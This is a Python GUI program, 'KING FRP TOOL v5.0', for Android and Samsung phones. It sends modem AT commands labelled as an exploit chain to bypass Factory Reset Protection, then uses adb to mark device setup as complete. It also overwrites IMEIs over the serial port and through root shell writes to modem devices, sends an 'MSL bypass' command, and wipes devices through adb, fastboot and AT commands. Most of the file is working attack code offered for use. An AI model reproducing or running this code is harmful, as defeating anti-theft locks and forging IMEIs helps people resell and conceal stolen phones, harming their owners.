import tkinter as tk
from tkinter import ttk, messagebox
import serial
import serial.tools.list_ports
import subprocess
import threading
import time
import os

# =============================================================================
#  KING FRP TOOL v5.0 - DEVELOPED BY MOHAMED HASSAN (THE KING)
# =============================================================================

class KingFrpApp:
    def __init__(self, root):
        self.root = root
        # إعدادات النافذة الرئيسية
        self.root.title("KING FRP TOOL v5.0 - By Mohamed Hassan")
        self.root.geometry("950x780")
        self.root.configure(bg="#121212") # الخلفية السوداء الملكية

        # متغيرات النظام
        self.selected_port = tk.StringVar()
        self.imei1_var = tk.StringVar()
        self.imei2_var = tk.StringVar()
        self.adb_status_var = tk.StringVar(value="ADB: SEARCHING...")
        self.root_status_var = tk.StringVar(value="ROOT: UNKNOWN")

        # بناء الواجهة
        self.create_header()
        self.create_connection_manager()
        self.create_repair_section()
        self.create_format_section()
        self.create_log_console()
        
        # تشغيل مراقب ADB في الخلفية
        self.check_adb_loop()

    # -------------------------------------------------------------------------
    # 1. تصميم الواجهة (GUI Design)
    # -------------------------------------------------------------------------
    def create_header(self):
        header_frame = tk.Frame(self.root, bg="#121212")
        header_frame.pack(pady=15)
        
        # العنوان الذهبي الكبير
        lbl_title = tk.Label(header_frame, text="KING FRP TOOL", font=("Impact", 40), fg="#ffd700", bg="#121212")
        lbl_title.pack()
        
        # التوقيع الرسمي
        lbl_signature = tk.Label(header_frame, text="Developed by: Mohamed Hassan", font=("Segoe UI", 12, "bold"), fg="white", bg="#121212")
        lbl_signature.pack(pady=2)

    def create_connection_manager(self):
        frame = tk.LabelFrame(self.root, text=" [ CONNECTION MANAGER ] ", font=("Consolas", 10, "bold"), bg="#1e1e1e", fg="#00ff00", bd=1)
        frame.pack(fill="x", padx=20, pady=5)

        lbl_port = tk.Label(frame, text="SELECT PORT:", bg="#1e1e1e", fg="white", font=("Arial", 9, "bold"))
        lbl_port.grid(row=0, column=0, padx=10, pady=15)

        self.combo_ports = ttk.Combobox(frame, textvariable=self.selected_port, width=45, state="readonly")
        self.combo_ports.grid(row=0, column=1, padx=5)
        self.refresh_ports()

        btn_refresh = tk.Button(frame, text="SCAN PORTS", command=self.refresh_ports, bg="#333", fg="white", relief="raised", bd=2)
        btn_refresh.grid(row=0, column=2, padx=10)

        # حالة ADB و ROOT
        lbl_adb = tk.Label(frame, textvariable=self.adb_status_var, font=("Consolas", 11, "bold"), bg="#1e1e1e", fg="#00ff00")
        lbl_adb.grid(row=1, column=0, columnspan=2, sticky="w", padx=15, pady=5)
        
        lbl_root = tk.Label(frame, textvariable=self.root_status_var, font=("Consolas", 11, "bold"), bg="#1e1e1e", fg="#ffcc00")
        lbl_root.grid(row=1, column=2, sticky="e", padx=15, pady=5)

    def create_repair_section(self):
        frame = tk.LabelFrame(self.root, text=" [ REPAIR OPERATIONS ] ", font=("Consolas", 10, "bold"), bg="#1e1e1e", fg="#ffd700", bd=1)
        frame.pack(fill="x", padx=20, pady=10)

        # حقول إدخال الإيمي
        tk.Label(frame, text="IMEI 1:", bg="#1e1e1e", fg="#aaa").grid(row=0, column=0, padx=5, pady=5)
        entry_imei1 = tk.Entry(frame, textvariable=self.imei1_var, width=25, font=("Consolas", 11), bg="#333", fg="white", insertbackground="white")
        entry_imei1.grid(row=0, column=1, padx=5)

        tk.Label(frame, text="IMEI 2:", bg="#1e1e1e", fg="#aaa").grid(row=0, column=2, padx=5, pady=5)
        entry_imei2 = tk.Entry(frame, textvariable=self.imei2_var, width=25, font=("Consolas", 11), bg="#333", fg="white", insertbackground="white")
        entry_imei2.grid(row=0, column=3, padx=5)

        # أزرار الإصلاح
        btn_red = tk.Button(frame, text="REPAIR IMEI (ROOT MODE)\n[Samsung 2023+]", 
                            command=lambda: threading.Thread(target=self.start_root_repair).start(),
                            bg="#b71c1c", fg="white", font=("Segoe UI", 9, "bold"), width=28, height=2)
        btn_red.grid(row=1, column=0, columnspan=2, padx=10, pady=15)

        btn_blue = tk.Button(frame, text="REPAIR IMEI (AT LEGACY)\n[Old Samsung/MTK]", 
                             command=lambda: threading.Thread(target=self.start_at_legacy_repair).start(),
                             bg="#0d47a1", fg="white", font=("Segoe UI", 9, "bold"), width=28, height=2)
        btn_blue.grid(row=1, column=2, columnspan=2, padx=10, pady=15)

        # زر FRP الكبير
        btn_yellow = tk.Button(frame, text="KING FRP RESET (ENABLE ADB *#0*#)", 
                               command=lambda: threading.Thread(target=self.btn_frp_click).start(),
                               bg="#ff8f00", fg="black", font=("Segoe UI", 11, "bold"), width=60, height=2)
        btn_yellow.grid(row=2, column=0, columnspan=4, pady=10)

    def create_format_section(self):
        frame = tk.LabelFrame(self.root, text=" [ FACTORY RESET & FORMAT ] ", font=("Consolas", 10, "bold"), bg="#1e1e1e", fg="#ff3333", bd=1)
        frame.pack(fill="x", padx=20, pady=5)

        # زر 1: ADB Wipe
        btn_adb_fmt = tk.Button(frame, text="ADB FACTORY RESET\n(Recovery Mode)", 
                                command=lambda: threading.Thread(target=self.format_adb_mode).start(),
                                bg="#424242", fg="white", font=("Arial", 9, "bold"), width=25)
        btn_adb_fmt.grid(row=0, column=0, padx=15, pady=15)

        # زر 2: Fastboot Wipe
        btn_fb_fmt = tk.Button(frame, text="FASTBOOT FORMAT\n(Erase Userdata)", 
                               command=lambda: threading.Thread(target=self.format_fastboot_mode).start(),
                               bg="#616161", fg="white", font=("Arial", 9, "bold"), width=25)
        btn_fb_fmt.grid(row=0, column=1, padx=15, pady=15)

        # زر 3: Samsung AT Wipe
        btn_sam_fmt = tk.Button(frame, text="SAMSUNG AT RESET\n(Via Modem Port)", 
                                command=lambda: threading.Thread(target=self.format_samsung_at).start(),
                                bg="#212121", fg="#00e676", font=("Arial", 9, "bold"), width=25)
        btn_sam_fmt.grid(row=0, column=2, padx=15, pady=15)

    def create_log_console(self):
        frame = tk.LabelFrame(self.root, text=" SYSTEM LOGS ", font=("Arial", 8), bg="#1e1e1e", fg="#555", bd=0)
        frame.pack(fill="both", expand=True, padx=20, pady=5)
        
        self.log_text = tk.Text(frame, bg="black", fg="#00ff00", font=("Consolas", 9), state="disabled", bd=0)
        self.log_text.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.log("Welcome back, King Mohamed Hassan.")
        self.log("King FRP Tool v5.0 Initialized successfully.")
        self.log("Waiting for device connection...")

    # -------------------------------------------------------------------------
    # 2. الوظائف المساعدة (Helpers)
    # -------------------------------------------------------------------------
    def log(self, message):
        timestamp = time.strftime("[%H:%M:%S]")
        full_msg = f"{timestamp} {message}\n"
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, full_msg)
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")

    def refresh_ports(self):
        self.combo_ports.set('')
        ports = serial.tools.list_ports.comports()
        port_list = []
        for port in ports:
            desc = f"{port.device} - {port.description}"
            port_list.append(desc)
            # اختيار تلقائي للمودم
            if "Modem" in port.description or "SAMSUNG" in port.description:
                self.selected_port.set(desc)
        
        self.combo_ports['values'] = port_list
        if not port_list:
            self.combo_ports.set("No Ports Found")

    def get_clean_port(self):
        val = self.selected_port.get()
        if " - " in val:
            return val.split(" - ")[0]
        return val

    def check_adb_loop(self):
        # وظيفة تعمل في الخلفية لفحص حالة ADB والروت باستمرار
        def _check():
            while True:
                try:
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    
                    # فحص ADB
                    output = subprocess.check_output(["adb", "devices"], startupinfo=startupinfo, creationflags=0x08000000).decode()
                    if "device" in output.replace("List of devices attached", "").strip():
                        self.adb_status_var.set("ADB: ONLINE [OK]")
                        
                        # فحص Root
                        try:
                            root_check = subprocess.check_output(["adb", "shell", "su", "-c", "id"], startupinfo=startupinfo, creationflags=0x08000000).decode()
                            if "uid=0" in root_check:
                                self.root_status_var.set("ROOT: GRANTED [YES]")
                            else:
                                self.root_status_var.set("ROOT: NO SU BINARY")
                        except:
                             self.root_status_var.set("ROOT: NO ACCESS")
                    else:
                        self.adb_status_var.set("ADB: DISCONNECTED")
                        self.root_status_var.set("ROOT: UNKNOWN")
                except:
                    pass
                time.sleep(2)
        
        threading.Thread(target=_check, daemon=True).start()

    # -------------------------------------------------------------------------
    # 3. وظائف الفرمتة (FORMAT OPERATIONS)
    # -------------------------------------------------------------------------
    def format_adb_mode(self):
        self.log(">>> Starting ADB Factory Reset...")
        if "DISCONNECTED" in self.adb_status_var.get():
            self.log("[ERROR] Device not connected via ADB! Enable USB Debugging.")
            return
        
        self.log(" -> Rebooting device to Recovery Mode...")
        self.log(" -> (User must select 'Wipe Data/Factory Reset' manually if not rooted)")
        subprocess.call("adb reboot recovery", shell=True, creationflags=0x08000000)
        
        # محاولة المسح المباشر إذا كان هناك روت
        self.log(" -> Attempting direct wipe (Root only)...")
        subprocess.call("adb shell su -c 'recovery --wipe_data'", shell=True, creationflags=0x08000000)
        self.log("[DONE] Commands sent.")

    def format_fastboot_mode(self):
        self.log(">>> Starting FASTBOOT Format...")
        self.log(" -> Searching for Fastboot device...")
        try:
            output = subprocess.check_output("fastboot devices", shell=True, creationflags=0x08000000).decode()
            if "fastboot" in output:
                self.log(" [OK] Fastboot Device Detected.")
                self.log(" -> Erasing Userdata partition...")
                subprocess.call("fastboot erase userdata", shell=True, creationflags=0x08000000)
                subprocess.call("fastboot -w", shell=True, creationflags=0x08000000)
                self.log(" [SUCCESS] Format Complete! Rebooting...")
                subprocess.call("fastboot reboot", shell=True, creationflags=0x08000000)
            else:
                self.log("[FAIL] No Fastboot Device Found! Check cable/drivers.")
        except Exception as e:
            self.log(f"[ERROR] Fastboot Error: {e}")

    def format_samsung_at(self):
        port = self.get_clean_port()
        if not port: return self.log("[ERROR] Select Port First!")
        
        self.log(f">>> Sending Samsung Factory Reset Code to {port}...")
        try:
            ser = serial.Serial(port, 115200, timeout=1)
            ser.write(b"AT\r\n"); time.sleep(0.5)
            
            self.log(" -> Sending AT+FACTORST=0,0 ...")
            ser.write(b"AT+FACTORST=0,0\r\n")
            time.sleep(1)
            
            resp = ser.read_all().decode(errors='ignore')
            self.log(f"Response: {resp.strip()}")
            
            if "OK" in resp:
                self.log("[SUCCESS] Reset Command Accepted! Phone is resetting...")
            else:
                self.log("[FAIL] Command Rejected. Use Recovery Mode.")
            ser.close()
        except Exception as e: self.log(f"Error: {e}")

    # -------------------------------------------------------------------------
    # 4. وظائف الإصلاح (REPAIR OPERATIONS)
    # -------------------------------------------------------------------------
    def start_at_legacy_repair(self):
        # إصلاح الإيمي بالطريقة القديمة (بدون روت)
        port = self.get_clean_port()
        imei = self.imei1_var.get()
        if not port: return self.log("[ERROR] Select Port First!")
        if len(imei) != 15: return self.log("[ERROR] IMEI must be 15 digits!")
        
        self.log(f"Starting Legacy Repair on {port}...")
        try:
            ser = serial.Serial(port, 115200, timeout=1)
            # MSL Bypass
            ser.write(b"AT+QCMSL=0\r\n"); time.sleep(0.5)
            # Write IMEI
            cmd = f'AT+EGMR=1,7,"{imei}"\r\n'
            ser.write(cmd.encode()); time.sleep(1)
            
            resp = ser.read_all().decode(errors='ignore')
            self.log(f"Response: {resp.strip()}")
            ser.close()
        except Exception as e: self.log(f"Error: {e}")

    def btn_frp_click(self):
        # فك FRP باستخدام ثغرة *#0*#
        port = self.get_clean_port()
        if not port: return self.log("[ERROR] Select Port First!")
        
        self.log("--- STARTING KING FRP BYPASS (*#0*#) ---")
        self.log("STEP 1: Please Dial *#0*# on Emergency Screen NOW.")
        
        try:
            ser = serial.Serial(port, 115200, timeout=1)
            # سلسلة الثغرات (Exploit Chain 2024)
            cmds = [
                b"AT+KSTRINGB=0,3\r\n", 
                b"AT+DUMPCTRL=1,0\r\n", 
                b"AT+DEBUGLVC=0,5\r\n", 
                b"AT+SW AT\r\n"
            ]
            for cmd in cmds:
                self.log(f" -> Sending Exploit: {cmd.strip().decode()}")
                ser.write(cmd); time.sleep(0.4)
            ser.close()
            
            self.log("Exploit Sent. Look at phone screen & press 'Allow'...")
            
            # انتظار تفعيل ADB
            for i in range(20):
                if "ONLINE" in self.adb_status_var.get():
                    self.log("[SUCCESS] ADB Detected! Removing FRP Lock...")
                    subprocess.call("adb shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1", shell=True, creationflags=0x08000000)
                    subprocess.call("adb shell am start -n com.google.android.gsf.login/com.google.android.gsf.login.LoginActivity", shell=True, creationflags=0x08000000)
                    time.sleep(1)
                    self.log("[DONE] King FRP Removed! Rebooting Device...")
                    subprocess.call("adb reboot", shell=True, creationflags=0x08000000)
                    return
                time.sleep(1)
            self.log("[FAIL] ADB not detected within timeout.")
        except Exception as e: self.log(f"Error: {e}")

    def start_root_repair(self):
        # إصلاح الإيمي بالطريقة الحديثة (ADB Root)
        imei = self.imei1_var.get()
        if len(imei) != 15: return self.log("[ERROR] IMEI must be 15 digits!")
        
        self.log(f"Writing IMEI (ROOT Mode): {imei}")
        
        # أوامر ADB Shell مع صلاحيات Root
        cmds = [
            'adb shell su -c "stop ril-daemon"',
            f'adb shell su -c "echo -e \'AT+EGMR=1,7,\\"{imei}\\"\' > /dev/ttyacm0"',
            f'adb shell su -c "echo -e \'AT+EGMR=1,7,\\"{imei}\\"\' > /dev/smd0"',
            'adb shell su -c "start ril-daemon"'
        ]
        
        for cmd in cmds:
            self.log(f" -> Executing: {cmd}")
            subprocess.call(cmd, shell=True, creationflags=0x08000000)
            time.sleep(1)
            
        self.log("[DONE] Root repair sequence finished. Please reboot manually.")

# =============================================================================
#  MAIN EXECUTION
# =============================================================================
if __name__ == "__main__":
    root = tk.Tk()
    app = KingFrpApp(root)
    root.mainloop()